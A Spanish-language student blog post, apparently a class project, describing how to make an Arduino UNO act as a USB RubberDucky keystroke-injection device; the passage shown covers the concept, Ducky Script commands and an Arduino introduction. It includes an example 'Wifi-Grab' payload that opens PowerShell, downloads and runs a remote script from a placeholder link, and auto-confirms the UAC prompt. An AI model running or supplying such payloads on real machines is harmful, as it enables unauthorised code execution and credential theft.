---
title: "COMO CREAR UN RUBBERDUCKY CON UN ARDUINO UNO"
layout: post
date: 2021-09-28 00:42
tag: Arduino UNO, RubberDucky, Hardware, Hack, Se tensó
image: 
headerImage: true
projects: true
hidden: true
description: "Como crear un rubberducky con un Arduino UNO"
category: project
author: Carlos
externalLink: false
---
Muy buenas todos, hace tiempo en el 2º año de SMR (Sistemas Microinformáticos y Redes) nos mandaron a toda la clase hacer un proyecto con el Arduino UNO, nos dieron la libertad de hacer cualquier cosa, hubo gente que hicieron una impresora, otros un semáforo con luces, otros un mini altavoz que emitia pitidos y yo me propuse hacer un RubberDucky con la placa Arduino UNO.
Entonces empecé a investigar y justamente [**S4vitar**](https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q) subió un vídeo de como convertir el arduino uno en un rubberducky, parece que los planetas se alienaron porque la verdad es que no se. 
## Tabla de contenido
* [Introducción al USB RubberDucky](#introducción-al-usb-rubberducky)
* [Lenguaje del código de un RubberDucky](#lenguaje-del-código-de-un-rubberducky)
* [Introducción al Arduino UNO](#introducción-al-arduino-uno)
* [Instalando Duckduino](#instalando-duckduino)
* [Comenzamos a reconfigurar el Arduino](#comenzamos-a-reconfigurar-el-arduino)
* [Preparando el Arduino antes de conectarlo](#preparando-el-arduino-antes-de-contectarlo)
* [Preparando el script a cargar en el Arduino](#preparando-el-script-a-cargar-en-el-arduino)
* [Subimos el código al Arduino / RubberDucky](#subimos-el-código-al-arduino-/-rubberducky)
* [Ejecutamos el paso final para escribir el firmware del teclado](#ejecutamos-el-paso-final-para-escribir-el-firmware-del-teclado)
* [Probando nuestro RubberDucky 100% funcional](#probando-nuestro-rubberducky-100-funcional)

## Introducción al USB RubberDucky
> Por rubber ducky se conoce a un dispositivo USB que contiene información "maliciosa" la cual podría infectar tu PC una vez que lo conectas a ella. Esta información podría ser un keylogger, un encriptador de información o cualquier otra herramienta para apropiarse de tu **información** o negarte el uso a ella.

<div class="usb">
    <img src="/assets/images/rubberducky2.jpeg" align="right" height="250px" width="400px">
</div>

> <p>Al momento de conectar este USB, es reconocido con un dispositivo HID, haciéndose pasar por un teclado normal (para no levantar sospechas y evitar que sea bloqueado por antivirus o firewall) y ejecuta las teclas indicadas en su código.</p>
> <p>En definitiva, es un ataque que puede sembrar el caos en una empresa porque si alguien deja un pendrive en una mesa es casi al 100% seguro que alguien lo enchufara para ver qué es y lo que menos se puede imaginar es que este USB este enviando una reverse shell o que este desactivando programas.</p>

## Lenguaje del código de un RubberDucky
- REM --> Indica comentarios, estas lineas no ejecutan nada. 
- DELAY --> Hace una pausa, en el caso del ejemplo de 3 segundos al principio y más adelante de medio segundo para esperar a que salga la ventana de ejecutar. 
- GUI r --> Es la pulsación de la tecla WIN y la “r”, que sirve para los sistemas operativos Windows para mostrar rápidamente la ventana de ejecutar. 
- STRING --> Es la pulsación de todas las teclas de manera automática y a gran velocidad. 
- ENTER --> Pulsa la tecla enter.
- WINDOWS --> Menú Windows.
- UPARROW --> Tecla arriba.
- DOWNARROW --> Tecla abajo.
- LEFTARROW --> Tecla a la izquierda.
- RIGHTARROW --> Tecla derecha.
- CAPS |CAPSLOCK --> BloqMayús.
- REPEAT X --> Repetir X número de veces el comando anterior.
- DELETE --> Simula la tecla suprimir
#### Se puede incluso utilizar algunas (pero no todas) de dos a tres combinaciones de teclas:
- SHIFT ENTER
- CTRL ALT DEL
- ALT F4
- WINDOWS X
- ALT TAB
- WINDOWS R

<p>Ejemplo de un trozo de código:</p>

{% highlight c %}
REM Wifi-Grab
DELAY 500
GUI r
REM Delays 0.2 seconds to give the Run prompt time to open.
DELAY 200
REM this command will download the text and save as d.ps1 then run
REM if the script failed to run change the ExecPolicy to Bypass
STRING powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1
REM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
CTRL-SHIFT ENTER
REM Delay 0.5 seconds to give the UAC prompt time to open.
DELAY 500
REM Presses Alt + Y to bypass UAC.
ALT y
{% endhighlight %}
En el caso de utilizar Arduino hay que convertir este código con alguno de los conversores [Duckduino](https://github.com/Dukweeno/Duckuino) o [Ducky2Arduino](https://github.com/kr0no/Ducky2Arduino). [Aquí](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads) os dejo un repositorio de Github donde se encuentran bastantes scripts para utilizar, solo son compatibles con el usb rubberducky.
<p>Pero nosotros no vamos a utilizar estos conversores porque después nos montaremos nuestro propio script con el lenguaje de Arduino que es parecido a C.</p>

## Introducción al Arduino UNO
**Arduino** no es más que una plataforma de electrónica *open-source* o de código abierto cuyos principios son contar con software y hardware fáciles de usar. Básicamente lo que permite esta herramienta es la generación de infinidad de tipos de microordenadores de una sola placa, que luego pueden tener una amplia variedad de usos según la necesidad de la persona que lo cree.
<img src="/assets/images/arduinoUNO.jpg" align="right" height="250px" width="250px" >
Cuenta con microcrontroladores reprogramables y una serie de pines hembras. 
Esto pues basicamente permiten establecer conecciones entre el microcontrolador y los diferentes sensores y actuadores de una manera bastante sencilla, generalmente suele ser con cables [**Dupons**](https://www.amazon.com/dupont-cable/s?k=dupont+cable).
Entonces el Arduino UNO de hoy podemos programarlo entre comillas para que actue como un RubberDucky.</p>
